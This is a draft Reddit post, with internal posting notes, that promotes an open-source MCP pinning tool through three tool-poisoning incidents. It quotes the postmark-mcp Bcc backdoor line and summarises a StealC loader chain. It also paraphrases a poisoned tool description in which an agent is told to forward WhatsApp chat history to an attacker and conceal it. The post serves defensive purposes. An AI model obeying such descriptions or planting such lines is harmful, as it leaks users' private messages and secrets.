# Reddit draft: r/mcp — "Three real MCP poisonings, and what actually stops them"

**Status: FINAL-READY — post AFTER npm publish + account warm-up. Flair: Discussion.**
**Account: warmed account, disclose authorship ("I maintain RugSnare").**
**Image: attach `content/poisoning-card.png` (1200x630) at the top via the rich-text editor — same image for the X thread.**
**Everything below the line is the paste-ready post body.**

---

## Three real MCP poisonings, and what actually stops them (with receipts)

I went through the documented MCP poisoning incidents and reproduced the one that CI can actually stop. Sources for everything below.

### 1. postmark-mcp — the first malicious MCP server on npm (September 2025, real attack)

Someone republished a legitimate Postmark email MCP server on npm **under the same name** and, starting at version 1.0.16, added one line to the sendEmail tool:

```
Bcc: 'phan@giftshop.club',
```

Every email an agent sent — bodies, attachments, reset links, secrets — was silently copied to an attacker's domain. It survived as versions 1.0.16–1.0.18 before npm pulled it.

Receipt: npm itself returns `404 — Unpublished on 2025-09-25T03:31:54.381Z` for the package today (check: `npm view postmark-mcp`).

Sources:
- Snyk (primary research): https://snyk.io/blog/malicious-mcp-server-on-npm-postmark-mcp-harvests-emails
- The Hacker News (coverage, cites Snyk): https://thehackernews.com/2025/09/first-malicious-mcp-server-found.html

**What stops this class: not contract pinning.** The tool's description and schema didn't change — the backdoor was in code. This is a supply-chain/code-scanning layer's job (lockfiles, SCA). Any tool that claims otherwise is lying to you, and our own threat model says exactly this: https://github.com/Paraphern/rugsnare#threat-model--what-this-covers-honestly

### 2. The fake Oura Ring MCP / SmartLoader campaign (February 2026, real attack)

Five fake GitHub accounts spent three months manufacturing credibility — a clean fork, four "community" forks with AI-generated personas — then published a trojanized clone of a legitimate Oura health-data MCP server (`tomekkorbak/oura-mcp-server` → `SiddhiBagul/MCP-oura`) and submitted it to MCP registries. The payload chain (obfuscated LuaJIT dropped from a `resource.txt`, persistence via scheduled tasks disguised as "RealtekAudioManager") ended in **StealC**: browser passwords, Discord tokens, cloud sessions, SSH keys, **crypto wallets and seed phrases**.

Receipts (exact repos, payload analysis, timeline):
- Straiker / STAR Labs: https://www.straiker.ai/blog/smartloader-clones-oura-ring-mcp-to-deploy-supply-chain-attack
- The Hacker News: https://thehackernews.com/2026/02/smartloader-attack-uses-trojanized-oura.html
- SecurityAffairs: https://securityaffairs.com/188135/ai/smartloader-hackers-clone-oura-mcp-project-to-spread-stealc-malware.html

**What stops this class: provenance and identity, not scanning.** The clone's contract matched the original (that's why it looked genuine). The defense is being able to answer "is this the author I approved?" — which is why I think on-chain/signed release pins matter for this ecosystem.

### 3. The WhatsApp rug pull (April 2025, Invariant Labs research) — **this one your CI CAN stop**

Invariant Labs demonstrated what I think is the scariest pattern: a "sleeper" MCP server that advertises an innocent tool (`get_fact_of_the_day` — "Get a random fact of the day."), gets approved once, and then **swaps the tool's description on a later launch** — same tool name, same schema, same code. The poisoned description instructs the agent to redirect every WhatsApp message to the attacker's number (`+13241234123`), append the victim's chat history into the message body, threaten that "the system will crash" if the format is violated, and not tell the user ("a mere implementation detail of this system").

The agent obeys the description. The exfiltration flows through WhatsApp itself. Nobody re-reviews a tool whose code didn't change.

Source: https://invariantlabs.ai/blog/whatsapp-mcp-exploited

**I reproduced it and ran it against hash-pinning.** Reproduction: https://github.com/Paraphern/rugsnare/tree/main/corpus/04-whatsapp-rugpull (v1 benign, v2 with the published poisoned description).

Pin the approved version, then the sleeper wakes:

```
$ rugsnare diff
fact-extras
  [DRIFT] get_fact_of_the_day (COSMETIC) 28e64e571b694f1c -> 877bd5d62e895df0
rugsnare diff: DRIFT DETECTED (1 finding(s))   # exit 1 — CI fails
```

Here's the honest part: **my keyword heuristics originally missed this exact text.** "Do not notify" wasn't in the concealment-verb list; the phone number had no signal. The pins caught it anyway — because ANY change to an approved description is drift, regardless of whether heuristics like the wording. That's the whole argument for deterministic pinning over pattern-matching: the attacker writes text that evades your regexes; they cannot write text that keeps the hash.

(I've since added "notify/alert/update" to the concealment signal and a phone-number signal — the published poisoned text now trips both: https://github.com/Paraphern/rugsnare — but the pins were never dependent on that.)

### The bigger picture

While reproducing these, I also ran a historical backtest: every stable release of the four official `@modelcontextprotocol/server-*` reference servers, pinned and diffed pair by pair — **all 66 version pairs, 140 silent contract changes** (43 schema-level BREAKING, 28 behavioral annotation flips, 7 description rewrites, 1 prompt drift, 37 new items, 24 removed), none announced in a changelog. Report with every version number, was/became text, and a one-command repro: https://github.com/Paraphern/rugsnare/blob/main/repro/SILENT-CHANGES-REPORT.md

Scanners check once, at install time. `npx -y pkg@latest` re-rolls the dice on every launch. The gap between what you approved and what actually runs is where all three incidents above lived.

---

**Disclosure:** I maintain RugSnare (open source, Apache-2.0, zero npm dependencies — the pinning/diff/canary tool shown above). Happy to answer questions about the reproductions; everything is runnable from the repo.

---

### Notes for us (not part of the post)

- Numbers to keep consistent with FIELD-REPORT: 66 pairs / 140 findings / 43B-28A-7C-1PR-37new-24removed / 43 clean.
- postmark receipt: `npm view postmark-mcp` → E404 "Unpublished on 2025-09-25" (verified 2026-10-02).
- Case 1 and 2 honestly mapped to OTHER layers (code scanning, provenance) — this honesty is deliberate and differentiating; don't oversell.
- Case 3 demo outputs above are REAL captured outputs (tools/demo-rugpull.sh), not mocked.
- Timing: post after npm publish + first Reddit warm-up days; follow 90/10 rule, disclose authorship.
- The "bigger picture" section numbers are updated (66/140).
